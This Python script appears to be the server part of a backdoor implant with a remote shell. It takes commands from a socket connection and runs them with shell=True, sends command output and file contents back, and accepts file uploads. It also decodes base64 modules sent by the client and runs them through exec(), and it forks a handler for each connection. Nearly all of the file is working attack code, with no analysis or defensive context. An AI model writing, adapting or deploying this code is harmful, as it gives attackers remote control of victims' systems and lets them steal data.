#!/usr/bin/env python
import os, sys, re, signal
import socket
import time
from base64 import *
from subprocess import Popen,PIPE,STDOUT,call
import platform

socksize = 4096                            
activePID = []
Home_Dir = os.environ['HOME']
if os.geteuid() != 0:
    currentuser = "nonroot"
else:
    currentuser = "root"


def module_handler(module, modname):
    status_msg("[~] Module: %s\n" % modname)
    exec(module)
    connection.send("shell => ")


def status_msg(message):
    connection.send("%s" % message)


def cat_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        catfile = open(filename, "rb")
        connection.send("[*] Contents of %s" % filename)
        for lines in catfile.readlines():
            connection.sendall(lines)
        catfile.close()


def save_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        savefile = open(filename, "rb")
        filedata = savefile.read()
        savefile.close()
        connection.send(":savef %s" % filename)
        time.sleep(2)
        connection.sendall( filedata )
    else:
        pass


def cmd_exec(command):
    proc = Popen(command,
              shell=True,
              stdout=PIPE,
              stderr=PIPE,
               stdin=PIPE,
               )
    stdout, stderr = proc.communicate()
    connection.sendall( stdout )


def cmd2txt(command, textfile):
    os.system("%s > %s" % (command, textfile))
    save_file(textfile)
    os.system("rm %s" % textfile)


def reaper():                              
    while activePID:                        
        pid,stat = os.waitpid(0, os.WNOHANG)     
        if not pid: break
        activePID.remove(pid)


def handler(connection):                    
    time.sleep(2)     
                          
    while True:                                     
        cmd = connection.recv(socksize)
        proc = Popen(cmd,
              shell=True,
             stdout=PIPE,
             stderr=PIPE,
              stdin=PIPE,
              )
        stdout, stderr = proc.communicate()

        if cmd.startswith('cd'):
            try:
                destination = cmd[3:].replace('\n','')
                if os.path.isdir(destination):
                    os.chdir(destination)
                    current = os.getcwd()
                    connection.send("[*] current directory: %s" % current)
                    connection.send("shell => ")
                else:
                    connection.send("[!] Directory does not exist") 
                    connection.send("shell => ")
            except IndexError:
                pass
            
        if cmd.startswith(":upload"):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = connection.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                connection.send("[~] File upload complete!\n")
            if not os.path.isfile(filename):
                connection.send("[!] File upload failed! Please try again\n")

        elif cmd.startswith(":download"):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                connection.sendall(filedata)
            else:
                connection.send("[!] File not found!\n")
    
        elif cmd.startswith(":exec"):
            try:
                getname = cmd.split(" ")        # split mod name from cmd
                modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
    
                mod_data = ""                   # Our received file data will go here 
                data = connection.recv(socksize)
                mod_data += data
                #print("[+] Module recieved!") # Debug level message. Remove before distribution.
                connection.send("Complete")     # sends OK msg to the client
                modexec = b64decode(mod_data)   # decode the received file
                module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
                
            except IndexError:
                pass

        elif cmd == (":quit"):
            print("[!] Closing server!")
            conn.close()
            os._exit(0)
            sys.exit(0)

        elif proc:
            connection.send( stdout )
            connection.send("shell => ")

    connection.close() 
    os._exit(0)


def accept():                                
    while 1:   
        global connection                                  
        connection, address = conn.accept()
        connection.send("shell => ")
        reaper()
        childPid = os.fork()                     # forks the incoming connection and sends to conn handler
        if childPid == 0:
            handler(connection)
        else:
            activePID.append(childPid)


